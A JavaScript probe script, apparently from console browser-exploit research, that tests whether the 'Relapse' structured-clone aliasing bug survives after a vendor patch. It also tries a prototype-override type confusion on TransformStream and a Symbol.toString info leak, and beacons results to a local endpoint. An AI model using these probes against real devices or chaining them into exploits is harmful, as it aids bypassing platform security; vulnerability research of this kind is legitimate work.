/*
 * p427 -- Relapse variant: structured clone duplicate-reference aliasing
 *
 * Relapse exploit uses history.replaceState for structured clone with
 * duplicate-reference aliasing. Sony patched this in 14.00.
 * Key question: did they patch SerializedScriptValue (the underlying bug)
 * or only history.replaceState?
 *
 * Tests: structuredClone(), MessageChannel.postMessage(), Worker.postMessage()
 * for duplicate-reference aliasing behavior.
 *
 * Also tests: Symbol.prototype.toString info leak (oversized string, 924176 chars)
 *
 * Beacon prefix: V427-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V427-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

// ================================================================
// Test A: history.replaceState with duplicate references
// This is the original Relapse vector -- likely patched
// ================================================================

function testA() {
  B("A-START");

  // Create array with duplicate reference
  var sharedObj = {marker: 0xDEAD};
  var arr = [sharedObj, sharedObj]; // same ref twice

  try {
    history.replaceState(arr, "");
    var cloned = history.state;

    // In a vulnerable build, cloned[0] and cloned[1] would be the same object
    // In a fixed build, they're separate copies
    var aliased = (cloned[0] === cloned[1]);

    B("A-HISTORY", {
      aliased: aliased,
      val0: cloned[0] ? cloned[0].marker : "null",
      val1: cloned[1] ? cloned[1].marker : "null",
      sameRef: aliased
    });

    // Modify one and check if other changes (true aliasing)
    if (cloned[0]) {
      cloned[0].marker = 0xBEEF;
      B("A-ALIAS-TEST", {
        after_modify_0: cloned[0].marker,
        after_modify_1: cloned[1] ? cloned[1].marker : "null",
        aliased: cloned[1] && cloned[1].marker === 0xBEEF
      });
    }
  } catch(e) {
    B("A-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test B: structuredClone() API with duplicate references
// ================================================================

function testB() {
  B("B-START");

  var sharedObj = {marker: 0xCAFE};
  var sharedAB = new ArrayBuffer(32);
  new Uint32Array(sharedAB)[0] = 0x41414141;

  // Test with shared object
  var arr1 = [sharedObj, sharedObj];
  try {
    var cloned1 = structuredClone(arr1);
    var aliased1 = (cloned1[0] === cloned1[1]);
    B("B-OBJ-ALIAS", {aliased: aliased1});

    if (aliased1) {
      cloned1[0].marker = 0x9999;
      B("B-OBJ-MUTATION", {
        v0: cloned1[0].marker,
        v1: cloned1[1].marker,
        propagated: cloned1[1].marker === 0x9999
      });
    }
  } catch(e) {
    B("B-OBJ-ERR", e.message.slice(0, 60));
  }

  // Test with shared ArrayBuffer (NOT transferred)
  var arr2 = [new Uint8Array(sharedAB), new Uint32Array(sharedAB)];
  try {
    var cloned2 = structuredClone(arr2);
    // Check if views share the same buffer
    var u8 = cloned2[0];
    var u32 = cloned2[1];
    var shareBuffer = (u8.buffer === u32.buffer);
    B("B-VIEW-SHARE", {
      shareBuffer: shareBuffer,
      u8len: u8.length,
      u32len: u32.length,
      u8_0: u8[0],
      u32_0: u32[0]
    });

    // Modify through one view, check the other
    u32[0] = 0xDEADBEEF;
    B("B-VIEW-CROSS", {
      u8_after: [u8[0], u8[1], u8[2], u8[3]],
      u32_after: u32[0],
      crossWrite: u8[0] === 0xEF // little-endian: 0xEF is LSB of 0xDEADBEEF
    });
  } catch(e) {
    B("B-VIEW-ERR", e.message.slice(0, 60));
  }
}

// ================================================================
// Test C: Relapse-style large graph with filler + duplicate ref
// ================================================================

function testC() {
  B("C-START");

  // Replicate the Relapse outerGraph structure
  var FILLER_SIZE = 0x100; // Smaller than 0xFFFF for memory safety

  var fillerArray = new Array(FILLER_SIZE);
  for (var i = 0; i < FILLER_SIZE; i++) {
    fillerArray[i] = i;
  }

  // Create a Uint8Array that we want to corrupt via aliasing
  var targetAB = new ArrayBuffer(0x20);
  var targetView = new Uint8Array(targetAB);
  for (var i = 0; i < 0x20; i++) targetView[i] = 0x41;

  // The "outerGraph" from Relapse: [filler, targetView, targetView, controlValue]
  var outerGraph = [fillerArray, targetView, targetView, 0x42424242];

  // Clone via structuredClone
  try {
    var cloned = structuredClone(outerGraph);

    var view1 = cloned[1];
    var view2 = cloned[2];

    B("C-CLONE", {
      isU8_1: view1 instanceof Uint8Array,
      isU8_2: view2 instanceof Uint8Array,
      sameRef: view1 === view2,
      sameBuffer: view1 && view2 && view1.buffer === view2.buffer,
      len1: view1 ? view1.length : -1,
      len2: view2 ? view2.length : -1,
      val1_0: view1 ? view1[0] : -1,
      val2_0: view2 ? view2[0] : -1
    });

    // If aliased, modifying one should affect the other
    if (view1 && view2) {
      view1[0] = 0xBB;
      B("C-CROSS-WRITE", {
        v1_0: view1[0],
        v2_0: view2[0],
        crossWriteWorks: view2[0] === 0xBB
      });
    }
  } catch(e) {
    B("C-ERR", e.message.slice(0, 80));
  }

  // Also try via history.replaceState
  try {
    var outerGraph2 = [fillerArray, targetView, targetView, 0x43434343];
    history.replaceState(outerGraph2, "");
    var hCloned = history.state;

    if (hCloned) {
      var hv1 = hCloned[1];
      var hv2 = hCloned[2];
      B("C-HISTORY", {
        isU8_1: hv1 instanceof Uint8Array,
        isU8_2: hv2 instanceof Uint8Array,
        sameRef: hv1 === hv2,
        sameBuffer: hv1 && hv2 && hv1.buffer === hv2.buffer
      });
    }
  } catch(e) {
    B("C-HISTORY-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test D: MessageChannel with duplicate references
// ================================================================

function testD() {
  B("D-START");

  return new Promise(function(resolve) {
    var mc = new MessageChannel();

    var shared = {marker: 0xFEED};
    var msg = [shared, shared, {other: true}];

    mc.port2.onmessage = function(e) {
      var data = e.data;
      var aliased = (data[0] === data[1]);
      B("D-MC-ALIAS", {
        aliased: aliased,
        v0marker: data[0] ? data[0].marker : "null",
        v1marker: data[1] ? data[1].marker : "null"
      });

      if (aliased) {
        data[0].marker = 0xAAAA;
        B("D-MC-PROPAGATE", {
          v0: data[0].marker,
          v1: data[1].marker,
          propagated: data[1].marker === 0xAAAA
        });
      }

      mc.port1.close();
      mc.port2.close();
      resolve();
    };

    mc.port1.postMessage(msg);
  });
}

// ================================================================
// Test E: TransformStream existence check + type confusion
// ================================================================

function testE() {
  B("E-START");

  // Check if TransformStream exists
  B("E-TRANSFORMSTREAM", typeof TransformStream);

  if (typeof TransformStream !== "undefined") {
    B("E-TS-EXISTS", "YES");

    // CVE-2026-43705: Override Array.prototype[Symbol.iterator]
    var origIterator = Array.prototype[Symbol.iterator];
    var iterCallCount = 0;

    try {
      // Attempt 1: Substitute plain objects for stream slots
      Array.prototype[Symbol.iterator] = function() {
        iterCallCount++;
        var items = [
          {writable: {write: function(){}, close: function(){}}},  // fake writable
          {},  // fake transform
          {readable: {getReader: function(){ return {read: function(){return Promise.resolve({done:true})}}}}}  // fake readable
        ];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      };

      var ts;
      try {
        ts = new TransformStream();
        B("E-TS-CREATED", {iterCalls: iterCallCount, type: typeof ts});
      } catch(e) {
        B("E-TS-CREATE-ERR", e.message.slice(0, 80));
      }
    } catch(e) {
      B("E-TS-ITER-ERR", e.message.slice(0, 60));
    } finally {
      Array.prototype[Symbol.iterator] = origIterator;
    }

    // Test normal TransformStream creation
    try {
      var ts2 = new TransformStream({
        transform: function(chunk, controller) {
          controller.enqueue(chunk);
        }
      });
      B("E-TS-NORMAL", {
        hasReadable: "readable" in ts2,
        hasWritable: "writable" in ts2
      });
    } catch(e) {
      B("E-TS-NORMAL-ERR", e.message.slice(0, 60));
    }
  } else {
    B("E-NO-TRANSFORMSTREAM", "TransformStream not available");
  }
}

// ================================================================
// Test F: Symbol.prototype.toString info leak (Relapse technique)
// ================================================================

function testF() {
  B("F-START");

  try {
    // Create a Symbol with a description
    var sym = Symbol("test");
    var str = sym.toString();
    B("F-SYMBOL-BASIC", {str: str, len: str.length});

    // Try the oversized string technique
    // Relapse creates a wrapper that causes Symbol.toString to produce
    // a very long string containing address data
    var longDesc = "A".repeat(1000);
    var sym2 = Symbol(longDesc);
    var str2 = sym2.toString();
    B("F-SYMBOL-LONG", {len: str2.length, expected: longDesc.length + 8}); // "Symbol(" + desc + ")"

    // Check if Symbol.prototype.toString can be called with non-Symbol this
    try {
      var result = Symbol.prototype.toString.call({});
      B("F-SYMBOL-NONTHIS", result.slice(0, 40));
    } catch(e) {
      B("F-SYMBOL-NONTHIS-ERR", e.message.slice(0, 60));
    }

    // Try with Object.create(Symbol.prototype)
    try {
      var fakeSym = Object.create(Symbol.prototype);
      fakeSym.toString = Symbol.prototype.toString;
      var result2 = fakeSym.toString();
      B("F-FAKE-SYMBOL", result2.slice(0, 40));
    } catch(e) {
      B("F-FAKE-SYMBOL-ERR", e.message.slice(0, 60));
    }

    // Try wrapping to get oversized string
    try {
      var symObj = Object(sym);
      var str3 = String(symObj);
      B("F-WRAPPED-SYMBOL", {len: str3.length, str: str3.slice(0, 40)});
    } catch(e) {
      B("F-WRAPPED-ERR", e.message.slice(0, 60));
    }
  } catch(e) {
    B("F-ERR", e.message.slice(0, 60));
  }
}

testA();
testB();
testC();

var chain = testD();
chain.then(function() {
  testE();
  testF();
  B("DONE");
});
})();
